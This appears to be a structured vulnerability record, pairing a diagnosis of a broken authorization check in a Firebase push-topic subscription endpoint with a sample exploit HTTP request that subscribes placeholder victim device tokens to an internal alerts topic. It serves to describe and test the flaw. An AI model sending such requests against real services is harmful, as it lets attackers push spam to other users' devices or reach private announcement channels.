diagnosis: The endpoint subscribes an array of FCM registrationTokens to a push notification topic using Firebase Admin SDK. It accepts raw device tokens from the client without verifying whether those tokens belong to req.user.id. An attacker can force other users' devices to subscribe to spam topics or private announcement channels.
exploit_request:
POST /api/notifications/topics/subscribe HTTP/1.1
Host: push.saasalerts.net
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"topicName": "internal_incident_alerts", "registrationTokens": ["fcm_token_victim_device_1", "fcm_token_victim_device_2"]}
